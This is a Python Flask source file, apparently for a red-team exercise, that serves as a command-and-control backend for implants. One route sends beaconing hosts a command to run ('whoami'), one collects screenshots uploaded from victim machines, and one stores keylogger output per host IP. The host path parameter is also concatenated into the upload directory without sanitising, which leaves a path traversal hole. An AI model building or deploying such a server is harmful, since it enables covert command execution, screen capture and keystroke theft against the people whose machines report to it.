"""
A platform for tracking blue team activity
Author: Chris Vantine
"""

import os
from flask import Flask, request
from werkzeug.utils import secure_filename
import data as databaseobj


# route functions flagged as unused, disabling warning for this function.
# Also disabling warning about catch-all excepts
# pylint: disable=W0612, W0702
def init():
    """ Initialize backend app """

    database = databaseobj.Database("db.sqlite", "database/build_db.sql")
    app = Flask(__name__)
    app.config['UPLOAD_FOLDER'] = 'static/'
    app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg'}

    # This is defined here so that app exists and the things that need this
    # can have this.
    def allowed_file(filename):
        """
        checks if file is allowed
        """
        return '.' in filename and \
            filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

    @app.route("/conn")
    @app.route("/conn/")
    def beacon_handler():
        """
        manage beaconing connections
        :return: command to run on reporter
        """
        return "whoami"

    @app.route("/screen/<host>", methods=['POST'])
    @app.route("/screen/<host>/", methods=['POST'])
    def screenshot_handler(host):
        """
        Handler for screenshot uploads
        :param host: ip of reporter
        :return:  "invalid" if failed, "success" if successful
        """
        # set upload folder to hostname
        app.config['UPLOAD_FOLDER'] = "static/" + host
        try:
            os.stat(app.config['UPLOAD_FOLDER'])
        except:
            os.mkdir(app.config['UPLOAD_FOLDER'])

        # attempt to save file to disk
        try:
            file = request.files['file']
            # don't know why this breaks
            if allowed_file(file.filename):
            #if True:
                filename = secure_filename(file.filename)
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))

                # update database and return success
                database.add_file(host, app.config['UPLOAD_FOLDER'] + "/" + filename)
                return "success"
        except:
            return "failed"

        return None
        # I h8 pep8

    @app.route("/key/<host>/", methods=['POST'])
    def keylog_handler(host):
        """
        Handler for keylogger data, line by line
        :param host: ip of reporter
        :return: "invalid" if failed, "success" if successful
        """
        try:
            print("1")
            data = request.data
            print("2")
            database.add_keystroke(host, data)
            print("3")
            return "success"
        except:
            return "failed"

    return app
